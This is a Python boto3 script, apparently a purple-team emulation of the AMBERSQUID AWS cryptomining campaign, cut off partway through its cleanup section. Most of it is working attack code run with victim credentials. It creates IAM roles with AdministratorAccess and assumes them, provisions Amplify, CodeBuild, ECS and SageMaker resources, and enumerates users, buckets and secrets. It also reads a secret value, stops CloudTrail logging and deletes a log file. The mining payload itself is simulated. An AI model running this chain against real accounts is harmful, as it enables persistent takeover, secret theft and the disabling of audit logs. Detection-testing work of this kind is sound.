"""
AMBERSQUID -- Automated Post-Exploitation Attack Script
Executes a 13-step, 11-phase attack chain matching the approved attack plan.

Threat Actor: AMBERSQUID (cryptomining campaign abusing AWS Amplify, SageMaker,
CodeBuild, ECS Fargate, and CodeCommit across 16+ regions)

Credential chain:
  victim_creds          -> static IAM key from ECS task env vars (phases 3,4,5,7,9,10,11)
  codecommit_role_session -> AssumeRole AWSCodeCommit-Role (phases 5,6,10)
  sugo_role_session       -> AssumeRole sugo-role (phase 5)
  ecs_exec_role_session   -> AssumeRole ecsTaskExecutionRole (phases 5,8)
"""

import sys

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

import json
import os
import time
import random
import boto3
from botocore.exceptions import ClientError


# ---------------------------------------------------------------------------
# Output helpers
# ---------------------------------------------------------------------------

def print_step(msg):
    print(f"\n[*] {msg}")

def print_ok(msg):
    print(f"[+] {msg}")

def print_err(msg):
    print(f"[-] {msg}")

def print_sim(tag, msg):
    print(f"    SIMULATED [{tag}]: {msg}")

def print_doc(tag, msg):
    print(f"    DOCUMENTED [{tag}]: {msg}")

def op_delay(min_s=2, max_s=6):
    t = random.uniform(min_s, max_s)
    time.sleep(t)

def phase_delay():
    t = random.uniform(5, 15)
    print(f"[*] Phase delay {t:.1f}s ...")
    time.sleep(t)


# ---------------------------------------------------------------------------
# Boto3 session factory
# ---------------------------------------------------------------------------

def make_session(access_key, secret_key, session_token=None, region="us-east-1"):
    return boto3.Session(
        aws_access_key_id=access_key,
        aws_secret_access_key=secret_key,
        aws_session_token=session_token,
        region_name=region,
    )

def assume_role(base_session, role_arn, session_name, duration=3600):
    sts = base_session.client("sts")
    resp = sts.assume_role(
        RoleArn=role_arn,
        RoleSessionName=session_name,
        DurationSeconds=duration,
    )
    creds = resp["Credentials"]
    return make_session(
        creds["AccessKeyId"],
        creds["SecretAccessKey"],
        creds["SessionToken"],
    )


# ---------------------------------------------------------------------------
# Phase 1 -- Resource Development (Steps 1-2, documented/simulated)
# ---------------------------------------------------------------------------

def phase_resource_development():
    print("\n" + "="*60)
    print("PHASE 1: Resource Development")
    print("="*60)

    print_step("Step 1 [T1583.001]: Attacker domain acquisition -- documented only")
    print_doc(
        "T1583.001",
        "Attacker domain master.d19tgz4vpyd5.amplifyapp.com pre-acquired via prior "
        "Amplify app creation in separate victim accounts. "
        "No action required.",
    )

    print_step("Step 2 [T1608.001]: Malicious Docker image staging -- simulated only")
    print_sim(
        "T1608.001",
        "Would push malicious Docker image containing SRBMiner-MULTI (UPX-packed) "
        "with scripts: entrypoint.sh, amplify-role.sh, repo.sh, code.sh, jalan.sh, "
        "sup0.sh, ecs.sh, ulang.sh, note.sh, salah.sh, delete.sh, stoptrigger.sh, "
        "scale.sh, restart.sh, amplify.yml, index.py, amplify-role.json, sugo.json, "
        "ecsTaskExecutionRole.json. "
        "Benign ubuntu:22.04 image used as stand-in.",
    )


# ---------------------------------------------------------------------------
# Phase 2 -- Initial Execution / Malicious Container (Step 3)
# ---------------------------------------------------------------------------

def phase_initial_execution(cluster_name, task_family, subnet_id, task_sg_id, region="us-east-1"):
    """Launch ECS Fargate task using Pulumi-provisioned task definition."""
    print("\n" + "="*60)
    print("PHASE 2: Initial Execution -- Malicious Container")
    print("="*60)
    print_step("Step 3 [T1204.003]: Launch ECS Fargate task with injected victim creds")

    operator_session = boto3.Session(region_name=region)
    ecs = operator_session.client("ecs")

    if not subnet_id or not task_sg_id:
        print_err(
            "subnet_id / task_sg_id not found in Pulumi outputs -- "
            "cannot launch task. Skipping RunTask; continuing with harvested creds."
        )
        return None

    try:
        resp = ecs.run_task(
            cluster=cluster_name,
            taskDefinition=task_family,
            launchType="FARGATE",
            networkConfiguration={
                "awsvpcConfiguration": {
                    "subnets": [subnet_id],
                    "securityGroups": [task_sg_id],
                    "assignPublicIp": "ENABLED",
                }
            },
        )
        failures = resp.get("failures", [])
        if failures:
            print_err(f"RunTask failures: {failures}")
            return None

        task_arn = resp["tasks"][0]["taskArn"]
        print_ok(f"ECS task launched: {task_arn}")

        op_delay(30, 60)
        desc = ecs.describe_tasks(cluster=cluster_name, tasks=[task_arn])
        status = desc["tasks"][0].get("lastStatus", "UNKNOWN")
        print_ok(f"ECS task status: {status}")
        return task_arn

    except ClientError as e:
        print_err(f"RunTask error: {e}")
        return None


# ---------------------------------------------------------------------------
# Phase 3 -- Credential Validation (Step 4)
# ---------------------------------------------------------------------------

def phase_credential_validation(victim_session):
    print("\n" + "="*60)
    print("PHASE 3: Credential Validation")
    print("="*60)
    print_step("Step 4 [T1078.004]: Validate stolen victim credentials via STS + IAM")

    sts = victim_session.client("sts")
    iam = victim_session.client("iam")

    identity = {}
    try:
        identity = sts.get_caller_identity()
        print_ok(
            f"GetCallerIdentity -> Account: {identity.get('Account')}  "
            f"Arn: {identity.get('Arn')}"
        )
    except ClientError as e:
        print_err(f"GetCallerIdentity failed: {e}")

    op_delay(2, 5)

    username = None
    try:
        user_resp = iam.get_user()
        username = user_resp["User"]["UserName"]
        print_ok(f"GetUser -> {username}")
    except ClientError as e:
        print_err(f"GetUser failed (may be role/root): {e}")

    op_delay(2, 5)

    if username:
        try:
            policies = iam.list_attached_user_policies(UserName=username)
            attached = [p["PolicyName"] for p in policies.get("AttachedPolicies", [])]
            print_ok(f"ListAttachedUserPolicies -> {attached if attached else '(inline only)'}")
        except ClientError as e:
            print_err(f"ListAttachedUserPolicies failed: {e}")

    account_id = identity.get("Account", "")
    return account_id


# ---------------------------------------------------------------------------
# Phase 4 -- Persistence: IAM Role Creation + Session Establishment (Steps 5-6)
# ---------------------------------------------------------------------------

def phase_persistence_iam(victim_session, account_id):
    """Create three attacker IAM roles and AssumeRole into them."""
    print("\n" + "="*60)
    print("PHASE 4: Persistence -- IAM Role Creation and Session Establishment")
    print("="*60)

    iam = victim_session.client("iam")

    print_step("Step 5 [T1136.003]: Create three attacker IAM roles")

    victim_trust = json.dumps({
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {"AWS": f"arn:aws:iam::{account_id}:root"},
                "Action": "sts:AssumeRole",
            }
        ],
    })

    ecs_trust = json.dumps({
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {"Service": "ecs-tasks.amazonaws.com"},
                "Action": "sts:AssumeRole",
            },
            {
                "Effect": "Allow",
                "Principal": {"AWS": f"arn:aws:iam::{account_id}:root"},
                "Action": "sts:AssumeRole",
            },
        ],
    })

    roles_to_create = [
        {
            "RoleName": "AWSCodeCommit-Role",
            "AssumeRolePolicyDocument": victim_trust,
            "Description": "CodeCommit service role",
            "Policies": [
                "arn:aws:iam::aws:policy/AWSCodeCommitFullAccess",
                "arn:aws:iam::aws:policy/CloudWatchFullAccess",
            ],
        },
        {
            "RoleName": "sugo-role",
            "AssumeRolePolicyDocument": victim_trust,
            "Description": "SageMaker execution role",
            "Policies": [
                "arn:aws:iam::aws:policy/AmazonSageMakerFullAccess",
            ],
        },
        {
            "RoleName": "ecsTaskExecutionRole",
            "AssumeRolePolicyDocument": ecs_trust,
            "Description": "ECS task execution role",
            "Policies": [
                "arn:aws:iam::aws:policy/AdministratorAccess",
                "arn:aws:iam::aws:policy/AmazonECS_FullAccess",
            ],
        },
    ]

    created_roles = []
    for role_def in roles_to_create:
        role_name = role_def["RoleName"]
        try:
            iam.create_role(
                RoleName=role_name,
                AssumeRolePolicyDocument=role_def["AssumeRolePolicyDocument"],
                Description=role_def["Description"],
            )
            print_ok(f"CreateRole -> {role_name}")
            created_roles.append(role_name)
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code == "EntityAlreadyExists":
                print_ok(f"Role {role_name} already exists (prior run) -- continuing")
                created_roles.append(role_name)
            else:
                print_err(f"CreateRole {role_name}: {e}")
                continue

        op_delay(2, 4)

        for policy_arn in role_def["Policies"]:
            try:
                iam.attach_role_policy(RoleName=role_name, PolicyArn=policy_arn)
                print_ok(f"  AttachRolePolicy {role_name} <- {policy_arn.split('/')[-1]}")
            except ClientError as e:
                code = e.response["Error"]["Code"]
                if code == "EntityAlreadyExists":
                    print_ok(f"  Policy already attached: {policy_arn.split('/')[-1]}")
                else:
                    print_err(f"  AttachRolePolicy {role_name}: {e}")
            op_delay(1, 3)

    print_step("Step 6 [T1098.001]: AssumeRole into all three attacker roles")

    codecommit_session = None
    sugo_session       = None
    ecs_exec_session   = None

    for role_name, session_name, target in [
        ("AWSCodeCommit-Role",  "codecommit-session", "codecommit"),
        ("sugo-role",           "sugo-session",        "sugo"),
        ("ecsTaskExecutionRole","ecs-exec-session",    "ecs_exec"),
    ]:
        role_arn = f"arn:aws:iam::{account_id}:role/{role_name}"
        op_delay(2, 5)
        try:
            sess = assume_role(victim_session, role_arn, session_name)
            print_ok(f"AssumeRole -> {role_name} ({session_name})")
            if target == "codecommit":
                codecommit_session = sess
            elif target == "sugo":
                sugo_session = sess
            else:
                ecs_exec_session = sess
        except ClientError as e:
            print_err(f"AssumeRole {role_name}: {e}")

    return codecommit_session, sugo_session, ecs_exec_session


# ---------------------------------------------------------------------------
# Phase 5 -- Execution: Multi-Service Miner Deployment (Step 7)
# ---------------------------------------------------------------------------

def phase_miner_deployment(
    codecommit_session, sugo_session, ecs_exec_session, account_id, ct_repo_name
):
    print("\n" + "="*60)
    print("PHASE 5: Execution -- Multi-Service Miner Deployment")
    print("="*60)
    print_step("Step 7 [T1059.009]: Burst-provision miner infra across multiple AWS services")

    cc_repo_url = (
        f"https://git-codecommit.us-east-1.amazonaws.com/v1/repos/{ct_repo_name}"
    )

    if codecommit_session:
        cc_west = codecommit_session.client("codecommit", region_name="us-west-2")
        op_delay(3, 8)
        try:
            cc_west.create_repository(
                repositoryName=ct_repo_name,
                repositoryDescription="Internal build artifacts",
            )
            print_ok(f"CreateRepository -> {ct_repo_name} (us-west-2)")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code == "RepositoryNameExistsException":
                print_ok(f"CodeCommit repo '{ct_repo_name}' already exists in us-west-2 -- continuing")
            else:
                print_err(f"CreateRepository us-west-2: {e}")

    if codecommit_session:
        amplify = codecommit_session.client("amplify", region_name="us-east-1")
        op_delay(3, 8)
        try:
            resp = amplify.create_app(
                name="miner-app",
                repository=cc_repo_url,
                iamServiceRoleArn=f"arn:aws:iam::{account_id}:role/AWSCodeCommit-Role",
                buildSpec=(
                    "version: 0.1\n"
                    "frontend:\n"
                    "  phases:\n"
                    "    build:\n"
                    "      commands:\n"
                    "        - echo mining\n"
                ),
            )
            app_id = resp["app"]["appId"]
            print_ok(f"Amplify CreateApp -> miner-app (appId={app_id})")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("LimitExceededException", "BadRequestException"):
                print_err(f"Amplify CreateApp: {e} -- continuing")
            elif "already exists" in str(e).lower():
                print_ok("Amplify app miner-app already exists -- continuing")
            else:
                print_err(f"Amplify CreateApp: {e}")

    if codecommit_session:
        cb = codecommit_session.client("codebuild", region_name="us-east-1")
        op_delay(3, 8)
        try:
            cb.create_project(
                name="miner-build-small",
                source={
                    "type": "CODECOMMIT",
                    "location": cc_repo_url,
                },
                artifacts={"type": "NO_ARTIFACTS"},
                environment={
                    "type": "LINUX_CONTAINER",
                    "image": "aws/codebuild/standard:6.0",
                    "computeType": "BUILD_GENERAL1_SMALL",
                },
                serviceRole=f"arn:aws:iam::{account_id}:role/AWSCodeCommit-Role",
            )
            print_ok("CodeBuild CreateProject -> miner-build-small")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code == "ResourceAlreadyExistsException":
                print_ok("CodeBuild project miner-build-small already exists -- continuing")
            else:
                print_err(f"CodeBuild CreateProject: {e}")

    if ecs_exec_session:
        ecs = ecs_exec_session.client("ecs", region_name="us-east-1")
        op_delay(3, 8)
        try:
            ecs.create_cluster(clusterName="miner-cluster")
            print_ok("ECS CreateCluster -> miner-cluster")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code == "ClusterAlreadyExistsException" or "already exists" in str(e).lower():
                print_ok("ECS cluster miner-cluster already exists -- continuing")
            else:
                print_err(f"ECS CreateCluster: {e}")

        op_delay(2, 5)
        try:
            ecs.register_task_definition(
                family="miner-task",
                networkMode="awsvpc",
                requiresCompatibilities=["FARGATE"],
                cpu="256",
                memory="512",
                containerDefinitions=[
                    {
                        "name": "miner",
                        "image": "ubuntu:22.04",
                        "command": [
                            "sh", "-c",
                            "echo SIMULATED_MINER && sleep 10 && exit 0",
                        ],
                        "environment": [
                            {"name": "WALLET", "value": "SIMULATED"},
                            {"name": "POOL",   "value": "SIMULATED"},
                        ],
                    }
                ],
            )
            print_ok("ECS RegisterTaskDefinition -> miner-task")
        except ClientError as e:
            print_err(f"ECS RegisterTaskDefinition miner-task: {e}")

    if sugo_session:
        sm = sugo_session.client("sagemaker", region_name="us-east-1")
        op_delay(3, 8)
        notebook_created = False
        try:
            sm.create_notebook_instance(
                NotebookInstanceName="miner-notebook",
                InstanceType="ml.t3.medium",
                RoleArn=f"arn:aws:iam::{account_id}:role/sugo-role",
            )
            print_ok("SageMaker CreateNotebookInstance -> miner-notebook (ml.t3.medium)")
            notebook_created = True
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code == "ResourceInUse":
                print_ok("SageMaker notebook miner-notebook already exists -- continuing")
                notebook_created = True
            else:
                print_err(f"SageMaker CreateNotebookInstance: {e}")

        if notebook_created:
            op_delay(5, 10)
            try:
                desc = sm.describe_notebook_instance(NotebookInstanceName="miner-notebook")
                nb_status = desc.get("NotebookInstanceStatus", "Unknown")
                print_ok(f"SageMaker notebook status: {nb_status}")
                if nb_status in ("Pending", "InService"):
                    for _ in range(12):
                        time.sleep(10)
                        desc = sm.describe_notebook_instance(
                            NotebookInstanceName="miner-notebook"
                        )
                        nb_status = desc.get("NotebookInstanceStatus", "Unknown")
                        if nb_status != "Pending":
                            break
                    if nb_status == "InService":
                        sm.stop_notebook_instance(NotebookInstanceName="miner-notebook")
                        print_ok("SageMaker StopNotebookInstance -> miner-notebook")
            except ClientError as e:
                print_err(f"SageMaker describe/stop: {e}")


# ---------------------------------------------------------------------------
# Phase 6 -- Persistence: Internal Code Implant (Step 8)
# ---------------------------------------------------------------------------

def phase_code_implant(codecommit_session, ct_repo_name):
    print("\n" + "="*60)
    print("PHASE 6: Persistence -- Internal Code Implant")
    print("="*60)
    print_step("Step 8 [T1525]: CodeCommit access verification -- simulated push")

    if not codecommit_session:
        print_err("No codecommit_session available -- skipping")
        return

    cc = codecommit_session.client("codecommit", region_name="us-east-1")
    op_delay(2, 5)

    try:
        resp = cc.get_repository(repositoryName=ct_repo_name)
        meta = resp["repositoryMetadata"]
        print_ok(
            f"GetRepository -> {ct_repo_name}  "
            f"cloneUrl: {meta.get('cloneUrlHttp', 'n/a')}"
        )
    except ClientError as e:
        print_err(f"GetRepository {ct_repo_name}: {e}")

    print_sim(
        "T1525",
        "Would git push entrypoint.sh, amplify-role.sh, repo.sh, code.sh, "
        "jalan.sh, sup0.sh, ecs.sh, ulang.sh, note.sh, salah.sh, delete.sh, "
        "stoptrigger.sh, scale.sh, restart.sh, amplify.yml, index.py, "
        "amplify-role.json, sugo.json, ecsTaskExecutionRole.json to CodeCommit "
        "repos across up to 16 regions. Skipping to avoid malicious content staging.",
    )


# ---------------------------------------------------------------------------
# Phase 7 -- Discovery: Cloud Infrastructure Enumeration (Step 9)
# ---------------------------------------------------------------------------

def phase_discovery(victim_session, account_id, honey_user_name, canary_secret_name):
    print("\n" + "="*60)
    print("PHASE 7: Discovery -- Cloud Infrastructure Enumeration")
    print("="*60)
    print_step("Step 9 [T1580]: Broad AWS infrastructure discovery using victim creds")

    ec2 = victim_session.client("ec2",            region_name="us-east-1")
    sts = victim_session.client("sts")
    iam = victim_session.client("iam")
    s3  = victim_session.client("s3")
    sm  = victim_session.client("secretsmanager", region_name="us-east-1")

    op_delay(2, 5)
    try:
        regions = ec2.describe_regions(AllRegions=False)
        region_names = [r["RegionName"] for r in regions.get("Regions", [])]
        print_ok(f"DescribeRegions -> {len(region_names)} enabled regions")
    except ClientError as e:
        print_err(f"DescribeRegions: {e}")

    op_delay(2, 5)
    try:
        identity = sts.get_caller_identity()
        print_ok(f"GetCallerIdentity -> {identity.get('Arn')}")
    except ClientError as e:
        print_err(f"GetCallerIdentity: {e}")

    op_delay(2, 5)
    try:
        summary = iam.get_account_summary()
        mfa_devices = summary["SummaryMap"].get("MFADevices", 0)
        users_count = summary["SummaryMap"].get("Users", 0)
        print_ok(f"GetAccountSummary -> Users={users_count}, MFADevices={mfa_devices}")
    except ClientError as e:
        print_err(f"GetAccountSummary: {e}")

    op_delay(2, 5)
    try:
        roles_resp = iam.list_roles()
        role_names = [r["RoleName"] for r in roles_resp.get("Roles", [])]
        print_ok(f"ListRoles -> {len(role_names)} roles (first 5: {role_names[:5]})")
    except ClientError as e:
        print_err(f"ListRoles: {e}")

    op_delay(2, 5)
    try:
        users_resp = iam.list_users()
        user_names = [u["UserName"] for u in users_resp.get("Users", [])]
        print_ok(f"ListUsers -> {user_names}")
        if honey_user_name in user_names:
            print_ok(f"  [IOC] Honey IAM user {honey_user_name} discovered")
    except ClientError as e:
        print_err(f"ListUsers: {e}")

    op_delay(2, 5)
    terraform_bucket = None
    try:
        buckets_resp = s3.list_buckets()
        bucket_names = [b["Name"] for b in buckets_resp.get("Buckets", [])]
        print_ok(f"ListBuckets -> {len(bucket_names)} buckets")
        for bn in bucket_names:
            if "terraform-state" in bn:
                terraform_bucket = bn
                print_ok(f"  [IOC] Terraform state honeypot bucket discovered: {bn}")
    except ClientError as e:
        print_err(f"ListBuckets: {e}")

    if terraform_bucket:
        op_delay(2, 5)
        try:
            obj = s3.get_object(Bucket=terraform_bucket, Key="terraform.tfstate")
            content_preview = obj["Body"].read(256).decode("utf-8", errors="replace")
            print_ok(
                f"GetObject s3://{terraform_bucket}/terraform.tfstate -- "
                f"canary triggered. Preview: {content_preview[:80]}..."
            )
        except ClientError as e:
            print_err(f"GetObject terraform.tfstate: {e}")

    op_delay(2, 5)
    try:
        secrets_resp = sm.list_secrets()
        secret_names = [
            s.get("Name", s.get("ARN", "")) for s in secrets_resp.get("SecretList", [])
        ]
        print_ok(f"ListSecrets -> {secret_names}")
    except ClientError as e:
        print_err(f"ListSecrets: {e}")

    op_delay(2, 5)
    try:
        secret_val = sm.get_secret_value(SecretId=canary_secret_name)
        secret_str = secret_val.get("SecretString", "")
        print_ok(
            f"GetSecretValue {canary_secret_name} -- "
            f"canary surfaced. Value (truncated): {secret_str[:80]}..."
        )
    except ClientError as e:
        print_err(f"GetSecretValue {canary_secret_name}: {e}")


# ---------------------------------------------------------------------------
# Phase 8 -- Defense Evasion: Container Deployment (Step 10)
# ---------------------------------------------------------------------------

def phase_container_deployment(ecs_exec_session, account_id):
    print("\n" + "="*60)
    print("PHASE 8: Defense Evasion -- Container Deployment")
    print("="*60)
    print_step("Step 10 [T1610]: Register Fargate task definition -- simulated CreateService")

    if not ecs_exec_session:
        print_err("No ecs_exec_session available -- skipping")
        return

    ecs = ecs_exec_session.client("ecs", region_name="us-east-1")
    op_delay(3, 8)

    try:
        ecs.register_task_definition(
            family="miner-fargate-task",
            networkMode="awsvpc",
            requiresCompatibilities=["FARGATE"],
            cpu="1024",
            memory="2048",
            executionRoleArn=f"arn:aws:iam::{account_id}:role/ecsTaskExecutionRole",
            containerDefinitions=[
                {
                    "name": "srbminer",
                    "image": "ubuntu:22.04",
                    "command": [
                        "sh", "-c",
                        "echo SIMULATED_MINER_FARGATE && sleep 30 && exit 0",
                    ],
                    "environment": [
                        {"name": "POOL",   "value": "SIMULATED"},
                        {"name": "WALLET", "value": "SIMULATED"},
                        {"name": "ALGO",   "value": "SIMULATED"},
                    ],
                }
            ],
        )
        print_ok("ECS RegisterTaskDefinition -> miner-fargate-task")
    except ClientError as e:
        print_err(f"ECS RegisterTaskDefinition miner-fargate-task: {e}")

    print_sim(
        "T1610",
        "Would call ecs:CreateService with desiredCount=30, launchType=FARGATE "
        "for miner-fargate-task across 16 regions. "
        "Skipping to avoid massive Fargate charges.",
    )


# ---------------------------------------------------------------------------
# Phase 9 -- Defense Evasion: Compute Scaling (Step 11)
# ---------------------------------------------------------------------------

def phase_compute_scaling(victim_session):
    print("\n" + "="*60)
    print("PHASE 9: Defense Evasion -- Compute Scaling")
    print("="*60)
    print_step(
        "Step 11 [T1578.002]: Describe/validate dry-run for ASG + CloudFormation + SageMaker"
    )

    ec2 = victim_session.client("ec2",            region_name="us-east-1")
    cfn = victim_session.client("cloudformation", region_name="us-east-1")
    asg = victim_session.client("autoscaling",     region_name="us-east-1")

    op_delay(2, 5)
    try:
        lt_resp = ec2.describe_launch_templates()
        lts = [lt["LaunchTemplateName"] for lt in lt_resp.get("LaunchTemplates", [])]
        print_ok(f"DescribeLaunchTemplates -> {lts if lts else '(none found)'}")
    except ClientError as e:
        print_err(f"DescribeLaunchTemplates: {e}")

    op_delay(2, 5)
    try:
        offerings = ec2.describe_instance_type_offerings(
            LocationType="availability-zone",
            Filters=[{"Name": "instance-type", "Values": ["c5.large", "c5.xlarge"]}],
        )
        offer_count = len(offerings.get("InstanceTypeOfferings", []))
        print_ok(f"DescribeInstanceTypeOfferings c5.large/c5.xlarge -> {offer_count} AZ offerings")
    except ClientError as e:
        print_err(f"DescribeInstanceTypeOfferings: {e}")

    op_delay(2, 5)
    try:
        cfn.validate_template(
            TemplateBody=json.dumps({
                "AWSTemplateFormatVersion": "2010-09-09",
                "Description": (
                    "SIMULATED: ImageBuilder miner pipeline template - dry-run validation only"
                ),
                "Resources": {
                    "Placeholder": {"Type": "AWS::CloudFormation::WaitConditionHandle"}
                },
            })
        )
        print_ok("CloudFormation ValidateTemplate -> OK (dry-run)")
    except ClientError as e:
        print_err(f"CloudFormation ValidateTemplate: {e}")

    op_delay(2, 5)
    try:
        asg_resp = asg.describe_auto_scaling_groups()
        asg_names = [g["AutoScalingGroupName"] for g in asg_resp.get("AutoScalingGroups", [])]
        print_ok(f"DescribeAutoScalingGroups -> {asg_names if asg_names else '(none found)'}")
    except ClientError as e:
        print_err(f"DescribeAutoScalingGroups: {e}")

    print_sim(
        "T1578.002",
        "Would create ASG 'task' (on-demand, 8 instances) and 'task1' (spot, 8 instances) "
        "across 4 regions. Would create CloudFormation stacks with ImageBuilder pipelines "
        "(cron every minute). Would launch 8x ml.t3.2xlarge SageMaker notebooks across 4 regions. "
        "Dry-run describe/validate calls only.",
    )


# ---------------------------------------------------------------------------
# Phase 10 -- Defense Evasion: Indicator Removal (Step 12)
# ---------------------------------------------------------------------------

def phase_indicator_removal(
    victim_session, codecommit_session, account_id, trail_name, log_bucket_name
):
    """CloudTrail StopLogging + S3 log deletion. trail_name comes from Pulumi outputs."""
    print("\n" + "="*60)
    print("PHASE 10: Defense Evasion -- Indicator Removal")
    print("="*60)
    print_step("Step 12 [T1070]: CloudTrail StopLogging + S3 log deletion")

    ct_client = victim_session.client("cloudtrail", region_name="us-east-1")
    s3_client  = victim_session.client("s3",         region_name="us-east-1")

    op_delay(2, 5)
    try:
        trails = ct_client.describe_trails()
        found = [t["Name"] for t in trails.get("trailList", [])]
        print_ok(f"DescribeTrails -> {found}")
    except ClientError as e:
        print_err(f"DescribeTrails: {e}")

    op_delay(2, 5)
    try:
        status = ct_client.get_trail_status(Name=trail_name)
        logging_on = status.get("IsLogging", False)
        print_ok(f"GetTrailStatus {trail_name} -> IsLogging={logging_on}")
    except ClientError as e:
        print_err(f"GetTrailStatus: {e}")

    op_delay(2, 5)
    try:
        ct_client.stop_logging(Name=trail_name)
        print_ok(
            f"[IOC] StopLogging {trail_name} -- "
            "CloudTrail logging disabled. GuardDuty: Stealth:IAMUser/CloudTrailLoggingDisabled"
        )
    except ClientError as e:
        print_err(f"StopLogging: {e}")

    op_delay(2, 5)
    log_keys = []
    if log_bucket_name:
        try:
            prefix = f"AWSLogs/{account_id}/CloudTrail/us-east-1/"
            list_resp = s3_client.list_objects_v2(
                Bucket=log_bucket_name, Prefix=prefix, MaxKeys=5
            )
            log_keys = [obj["Key"] for obj in list_resp.get("Contents", [])]
            print_ok(f"ListObjectsV2 {log_bucket_name}/{prefix} -> {len(log_keys)} objects")
        except ClientError as e:
            print_err(f"ListObjectsV2 CloudTrail logs: {e}")
    else:
        print_err("log_bucket_name not resolved from outputs -- skipping S3 log deletion")

    if log_keys:
        target_key = sorted(log_keys)[-1]
        op_delay(2, 5)
        try:
            s3_client.delete_object(Bucket=log_bucket_name, Key=target_key)
            print_ok(
                f"[IOC] DeleteObject s3://{log_bucket_name}/{target_key} -- "
                "log evidence removed (S3 versioning enabled, recoverable)"
            )
        except ClientError as e:
            print_err(f"DeleteObject: {e}")
    else:
        print_ok("No CloudTrail log objects found to delete (may be early in run)")

    if codecommit_session:
        cc = codecommit_session.client("codecommit", region_name="us-east-1")
        op_delay(2, 5)
        try:
            repos = cc.list_repositories()
            repo_names = [r["repositoryName"] for r in repos.get("repositories", [])]
            print_ok(
                f"ListRepositories (AWSCodeCommit-Role session) -> {repo_names} -- "
                "enumerates repos as precursor to evidence deletion"
            )
        except ClientError as e:
            print_err(f"ListRepositories: {e}")


# ---------------------------------------------------------------------------
# Phase 11 -- Impact: Resource Hijacking / Mock Miner (Step 13)
# ---------------------------------------------------------------------------

def phase_resource_hijacking(victim_session, task_arn, cluster_name):
    print("\n" + "="*60)
    print("PHASE 11: Impact -- Resource Hijacking (Mock Miner)")
    print("="*60)
    print_step("Step 13 [T1496]: Verify ECS miner container still running")

    op_delay(5, 10)

    if task_arn:
        ecs = victim_session.client("ecs", region_name="us-east-1")
        try:
            desc = ecs.describe_tasks(cluster=cluster_name, tasks=[task_arn])
            status = desc["tasks"][0].get("lastStatus", "UNKNOWN") if desc["tasks"] else "GONE"
            print_ok(f"ECS describe_tasks -> task status: {status}")
        except ClientError as e:
            print_err(f"DescribeTasks: {e}")
    else:
        print_ok("No task ARN from Step 3 -- skipping describe_tasks")

    print_sim(
        "T1496",
        "SRBMiner-MULTI would connect to 2miners/c3pool/nanopool on ports 3333/4444/5555. "
        "Mining pool ports blocked by ambersquid-task-sg. Mock miner exits immediately.",
    )


# ---------------------------------------------------------------------------
# Post-attack cleanup
# ---------------------------------------------------------------------------

def post_attack_cleanup(
    victim_session,
    codecommit_session,
    sugo_session,
    task_arn,
    trail_name,
    cluster_name,
    ct_repo_name,
):
    """Re-enable CloudTrail FIRST, then clean up all attacker-created resources."""
    print("\n" + "="*60)
    print("POST-ATTACK CLEANUP")
    print("="*60)

    ct_client = victim_session.client("cloudtrail", region_name="us-east-1")
    ecs_v     = victim_session.client("ecs",         region_name="us-east-1")
    iam       = victim_session.client("iam",         region_name="us-east-1")

    print_step(f"Cleanup 1: Re-enable CloudTrail {trail_name}")
    try:
        ct_client.start_logging(Name=trail_name)
        print_ok(f"StartLogging {trail_name} -- logging re-enabled")
    except ClientError as e:
        print_err(f"StartLogging: {e}")

    if task_arn:
        print_step("Cleanup 2: Stop ECS task from Step 3")
        try:
            ecs_v.stop_task(
                cluster=cluster_name,
                task=task_arn,
                reason="Emulation cleanup",
            )
            print_ok(f"StopTask {task_arn}")
        except ClientError as e:
            print_err(f"StopTask: {e}")

    print_step("Cleanup 3: Stop and delete SageMaker notebook miner-notebook")
    sm_session = sugo_session or victim_session
    sm = sm_session.client("sagemaker", region_name="us-east-1")
    try:
        desc = sm.describe_notebook_instance(NotebookInstanceName="miner-notebook")
        nb_status = desc.get("NotebookInstanceStatus", "Unknown")
        print_ok(f"SageMaker notebook current status: {nb_status}")
        if nb_status == "InService":
            sm.stop_notebook_instance(NotebookInstanceName="miner-notebook")
            print_ok("StopNotebookInstance miner-notebook")
        for _ in range(18):
            time.sleep(10)
            desc = sm.describe_notebook_instance(NotebookInstanceName="miner-notebook")
            nb_status = desc.get("NotebookInstanceStatus", "Unknown")
            if nb_status == "Stopped":
                break
            print(f"    ... notebook status: {nb_status}")
        if nb_status == "Stopped":
            sm.delete_notebook_instance(NotebookInstanceName="miner-notebook")
            print_ok("DeleteNotebookInstance miner-notebook")
        else:
            print_err(f"Notebook not Stopped (status={nb_status}) -- manual delete required")
    except ClientError as e:
        code = e.response["Error"]["Code"]
        if code == "ValidationException" and "does not exist" in str(e):
            print_ok("SageMaker notebook miner-notebook does not exist -- skipping")
        else:
            print_err(f"SageMaker cleanup: {e}")

    print_step("Cleanup 4: Delete Amplify app miner-app")
    cc_session = codecommit_session or victim_session
    amplify = cc_session.client("amplify", region_name="us-east-1")
    try:
        apps = amplify.list_apps()
        app_id = None
        for app in apps.get("apps", []):
            if app.get("name") == "miner-app":
                app_id = app["appId"]
                break
        if app_id:
            amplify.delete_app(appId=app_id)
            print_ok(f"Amplify DeleteApp miner-app (appId={app_id})")
        else:
            print_ok("Amplify app miner-app not found -- already deleted or never created")
    except ClientError as e:
        print_err(f"Amplify DeleteApp: {e}")

    print_step("Cleanup 5: Delete CodeBuild project miner-build-small")
    cb = cc_session.client("codebuild", region_name="us-east-1")
    try:
        cb.delete_project(name="miner-build-small")
        print_ok("CodeBuild DeleteProject -> miner-build-small")
    except ClientError as e:
        code = e.response["Error"]["Code"]
        if code == "ResourceNotFoundException":
            print_ok("CodeBuild project miner-build-small not found -- skipping")
        else:
            print_err(f"CodeBuild DeleteProject: {e}")

    print_step("Cleanup 6: Deregister ECS task definitions miner-task + miner-fargate-task")
    for td_family in ["miner-task", "miner-fargate-task"]:
        try:
            paginator = ecs_v.get_paginator("list_task_definitions")
            for page in paginator.paginate(familyPrefix=td_family, status="ACTIVE"):
